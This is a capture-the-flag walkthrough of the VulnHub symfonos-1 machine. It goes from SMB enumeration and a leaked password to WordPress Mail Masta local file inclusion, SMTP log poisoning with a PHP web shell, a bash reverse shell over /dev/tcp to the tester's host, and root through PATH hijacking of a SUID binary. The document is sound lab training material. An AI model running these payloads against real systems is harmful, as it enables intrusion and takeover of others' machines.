# symfonos-1
![](https://i.imgur.com/FRq7bdF.png)

![](https://i.imgur.com/8iI7bZz.png)

## Scanning
### nmap
* After scanning, we found that smb service was provided.
```
$ nmap -p- -A -T5 192.168.109.131 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-30 21:58 EDT
Nmap scan report for 192.168.109.131
Host is up (0.0013s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 1s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-07-30T20:59:32-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-31T01:59:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.00 seconds
```
### enum4linux
* After scanning, we found that `//192.168.109.131/anonymous` allow to list.
```
$ enum4linux -U -S -o 192.168.109.131
Starting enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jul 30 22:06:33 2021

...

 ========================================= 
|    OS information on 192.168.109.131    |
 ========================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.109.131 from smbclient: 
[+] Got OS info for 192.168.109.131 from srvinfo:
        SYMFONOS       Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ================================ 
|    Users on 192.168.109.131    |
 ================================ 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: helios   Name:        Desc: 

user:[helios] rid:[0x3e8]

 ============================================ 
|    Share Enumeration on 192.168.109.131    |
 ============================================ 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 192.168.109.131
//192.168.109.131/print$        Mapping: DENIED, Listing: N/A
//192.168.109.131/helios        Mapping: DENIED, Listing: N/A
//192.168.109.131/anonymous     Mapping: OK, Listing: OK
//192.168.109.131/IPC$  [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Fri Jul 30 22:06:34 2021

```
### smbclient
#### anonymous
* We used sigle-space as the username and no password to connect to `//192.168.109.131/anonymous`.
* Then, we found `attention.txt`.
```
$ smbclient //192.168.109.131/anonymous -U % -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

                19994224 blocks of size 1024. 17301976 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (75.2 KiloBytes/sec) (average 75.2 KiloBytes/sec)
smb: \> 
```
* Futhermore, we found passwords like `epidioko`, `qwerty` and `baseball` in `attention.txt`.
```
$ cat attention.txt

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```
#### helios
* We used `qwerty` as the password and `helios` as the username to connect to `//192.168.109.131/helios`.
* Then, we found `research.txt` and `todo.txt`.
```
$ smbclient //192.168.109.131/helios -U helios qwerty
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Fri Jun 28 20:37:04 2019
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

                19994224 blocks of size 1024. 17301976 blocks available
smb: \> get research.txt
getting file \research.txt of size 432 as research.txt (105.5 KiloBytes/sec) (average 105.5 KiloBytes/sec)
smb: \> get todo.txt
getting file \todo.txt of size 52 as todo.txt (16.9 KiloBytes/sec) (average 67.5 KiloBytes/sec)
smb: \> 
```
* Besides, we found a path like `/h3l105` in `todo.txt`.
```
$ cat research.txt
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
                                                                
$ cat todo.txt
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```
### chrome
* We checked `http://192.168.109.131/h3l105/` by the browser.
* However, we found there were some errors like `ERR_NAME_NOT_RESOLVED`.
* Therefore, we should add `symfonos.local` as the domain name to `/etc/host`.
```
http://192.168.109.131/h3l105/
```
![](https://i.imgur.com/BtXLnPO.png)
```
192.168.109.131  symfonos.local
```
### wpscan
* After scanning, we found there was a `mail-masta Version: 1.0` plugin.
* Besides, we found there was a [WordPress Plugin Mail Masta 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/40290) vulnerability.
```
$ wpscan -e u,p --url http://symfonos.local/h3l105 --no-update 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://symfonos.local/h3l105/ [192.168.109.131]
[+] Started: Fri Jul 30 23:40:54 2021

...

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

...

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <> (0 / 10)  0.00%  ETA: ?? Brute Forcing Author IDs - Time: 00:00:00 <> (1 / 10) 10.00%  ETA: 00 Brute Forcing Author IDs - Time: 00:00:00 <> (5 / 10) 50.00%  ETA: 00 Brute Forcing Author IDs - Time: 00:00:00 <> (6 / 10) 60.00%  ETA: 00 Brute Forcing Author IDs - Time: 00:00:00 <> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://symfonos.local/h3l105/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

...
```
## Gain Access
### LFI
```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
```
![](https://i.imgur.com/WZTGo6B.png)

### RCE
```
$ telnet 192.168.109.131 25
Trying 192.168.109.131...
Connected to 192.168.109.131.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: <jack>
250 2.1.0 Ok
RCPT TO: Helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as 320EF40830
421 4.4.2 symfonos.localdomain Error: timeout exceeded
Connection closed by foreign host.  
```
```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id
```

![](https://i.imgur.com/srQX3Vu.png)

### Reverse Shell
```
$ nc -lvp 8787
```
```
http://symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=%2Fbin%2Fbash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.109.128%2F8787%20%3C%261%27
```

## Privilege Escalation
### SUID
```
$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```
### /opt/statuscheck
```
$ /opt/statuscheck
/opt/statuscheck
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0   328    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
HTTP/1.1 200 OK
Date: Sat, 31 Jul 2021 05:29:15 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html

```
```
$ strings /opt/statuscheck
strings /opt/statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
...
```
```
$ cd /tmp
$ echo "/bin/sh" > curl
$ chmod 777 curl
$ export PATH=/tmp:$PATH
$ /opt/statuscheck
id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
/bin/sh -i
/bin/sh: 0: can't access tty; job control turned off
# id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Reference
* [vulnhub - symfonos-1](https://www.vulnhub.com/entry/symfonos-1,322/)
* [Hacking Articles - Symfonos:1 Vulnhub Walkthrough](https://www.hackingarticles.in/symfonos1-vulnhub-walkthrough/)
* [blog.mzfr.me - Vulnhub - Symfonos writeup](https://blog.mzfr.me/vulnhub-writeups/2019-07-04-symfonos)
